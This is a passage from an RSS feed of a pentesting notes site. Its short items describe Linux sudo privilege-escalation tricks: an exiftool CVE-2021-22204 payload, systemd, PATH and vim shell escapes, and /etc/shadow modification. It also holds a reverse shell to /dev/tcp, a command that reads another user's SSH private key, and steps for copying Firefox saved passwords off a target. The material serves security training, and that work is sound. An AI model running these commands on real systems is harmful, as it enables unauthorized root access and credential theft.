      <description>Investigation link (root) NOPASSWD: /usr/local/bin/exiftool If we can execute &amp;ldquo;exiftool&amp;rdquo; command as root, we can gain access to privileges.&#xA;Arbitrary Code Execution (CVE-2021-22204) version 7.44+ linkReference: https://vk9-sec.com/exiftool-12-23-arbitrary-code-execution-privilege-escalation-cve-2021-22204/&#xA;Check the exiftool version.&#xA;If the exiftool version is later than 7.44, we can execute arbitrary code.&#xA;exiftool -ver Exploitation linkIn local machine, create the payload in a file named “exploit”.&#xA;(metadata &amp;#34;\c${system(&amp;#39;/bin/sh&amp;#39;)};&amp;#34;) Next, compress the file.&#xA;bzz exploit exploit.bzz Then create the DjVu file using the compressed file.</description>
    </item>
    <item>
      <title>Sudo Fail2ban Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/</guid>
      <description>Fail2ban is an intrusion prevention software framework.&#xA;It prevents against brute force attacks.&#xA;Investigation link sudo -l (root) NOPASSWD: /etc/init.d/fail2ban restart If we can execute &amp;ldquo;fail2ban&amp;rdquo; as root, we can gain access to privileges by modifying the configuration file.&#xA;We need to check if the config file is writable.&#xA;find /etc -writable -ls 2&amp;gt;/dev/null 4 drwxrwx--- 2 root security 4096 Oct 16 08:57 /etc/fail2ban/action.d Look inside of &amp;quot;/etc/fail2ban/jail.conf&amp;quot; to know more about how fail2ban is configured.</description>
    </item>
    <item>
      <title>Sudo Path Traversal Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL) /usr/bin/node /usr/local/scripts/*.js If the file path uses wildcards, we may execute arbitrary files.&#xA;In short, we can refer to files in different directories which the system owner unintended.&#xA;Exploitation linkAssume we can execute ‘node’ command as root and js file.&#xA;Create the “test.js” under /tmp, which spawns a root shell after executing ‘node’ command.&#xA;// /tmp/test.js require(&amp;#34;child_process&amp;#34;).spawn(&amp;#34;/bin/sh&amp;#34;, {stdio: [0, 1, 2]}) Now run ‘node’ command as root.</description>
    </item>
    <item>
      <title>Sudo Reboot Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL) NOPASSWD: /usr/sbin/reboot If we can execute &amp;ldquo;reboot&amp;rdquo; command as root, we can escalate to privileges.&#xA;Exploitation link1. Find Service Config Files Which Are Writable linkWe need to look for the system service config file which are writable.&#xA;find / -writable -name &amp;#34;*.service&amp;#34; 2&amp;gt;/dev/null /etc/systemd/system/example.service 2. Insert a Payload linkIf we find a writable file, we can inject a payload into Service.ExecStart.&#xA;# /etc/systemd/systm/example.service [Unit] Description=Zeno monitoring [Service] Type=simple User=root ExecStart=/bin/bash -c &amp;#39;cp /bin/bash /home/&amp;lt;username&amp;gt;/bash; chmod &amp;#43;xs /home/&amp;lt;username&amp;gt;/bash&amp;#39; [Install] WantedBy=multi-user.</description>
    </item>
    <item>
      <title>Sudo Screen Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-screen-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-screen-privilege-escalation/</guid>
      <description>Investigation link sudo -l (root) /usr/bin/screen -r testsession If we can execute &amp;ldquo;screen&amp;rdquo; command as root, we can spawn a root shell from the screen session.&#xA;Exploitation linkFirst execute &amp;ldquo;screen&amp;rdquo; command as root, then a screen session will be start.&#xA;Now we can spawn a root shell by pressing “Ctrl+a+c” in the screen session.</description>
    </item>
    <item>
      <title>Sudo Shutdown, Poweroff Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL) NOPASS: /usr/sbin/shutdown If we can execute &amp;ldquo;shutdown&amp;rdquo; command as root, we can gain access to privileges by overwriting the path of &amp;ldquo;poweroff&amp;rdquo;.&#xA;Exploitation linkFirst create /tmp/poweroff binary which invoke a shell.&#xA;echo /bin/sh &amp;gt; /tmp/poweroff # or echo /bin/bash &amp;gt; /tmp/poweroff Then change permissions of the file and add &amp;quot;/tmp&amp;quot; folder to PATH.&#xA;chmod &amp;#43;x /tmp/poweroff export PATH=/tmp:$PATH Now execute &amp;ldquo;shutdown&amp;rdquo; as root.&#xA;# Some SUID command sudo /usr/sbin/shutdown # Then you are root user root&amp;gt; /tmp/poweroff is executed and spawn a root shell.</description>
    </item>
    <item>
      <title>Sudo Vim Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-vim-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-vim-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL) NOPASSWD: vim example.txt If we can execute &amp;ldquo;vim&amp;rdquo; command as root, we can execute the shell command in the vim editor.&#xA;Exploitation linkSimply run &amp;ldquo;vim&amp;rdquo; command as root.&#xA;sudo vim example.txt In Vim editor, we can run shell commands as root.&#xA;:r!whoami </description>
    </item>
    <item>
      <title>Sudo Wall Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wall-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wall-privilege-escalation/</guid>
      <description>Investigation link sudo -l (ALL) NOPASSWD: wall Exploitation link # Reverse shell sudo wall &amp;#34;$(bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/&amp;lt;local-port&amp;gt; 0&amp;gt;&amp;amp;1&amp;#39;)&amp;#34; # Gets a SSH private key of another user sudo wall &amp;#34;$(cat /home/user/.ssh/id_rsa)&amp;#34; </description>
    </item>
    <item>
      <title>Sudo Wget Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/</guid>
      <description>Investigation link sudo -l (root) NOPASSWD: /usr/bin/wget If we can execute &amp;ldquo;wget&amp;rdquo; as root, we may be able to escalate privileges.&#xA;Modify /etc/shadow linkGet &amp;quot;/etc/shadow&amp;quot; and generate a new hash passwd, then set it to the shadow file, next upload it.&#xA;That changes the root password.&#xA;1. Get the Content of /etc/shadow linkTo see the content of /etc/shadow, we can use netcat listener.&#xA;So First, start a listener in local machine.</description>
    </item>
    <item>
      <title>Mozilla Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/mozilla-pentsting/</link>
      <pubDate>Thu, 02 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/mozilla-pentsting/</guid>
      <description>Extract Passwords from Firefox Profile link1. Transfer the .firefox Directory link Zip&#xA;First, zip .firefox directory in target machine, and open web server to transfer the zip file to local machine.&#xA;zip -r /tmp/firefox.zip .firefox cd /tmp python3 -m http.server 8000 In local machine, download the zip file from the remote machine, and decompress it.&#xA;wget http://&amp;lt;target-ip&amp;gt;:8000/mozilla.zip unzip mozilla.zip Tar&#xA;If we cannot use zip, tar also can be used.</description>
    </item>
  </channel>
</rss>
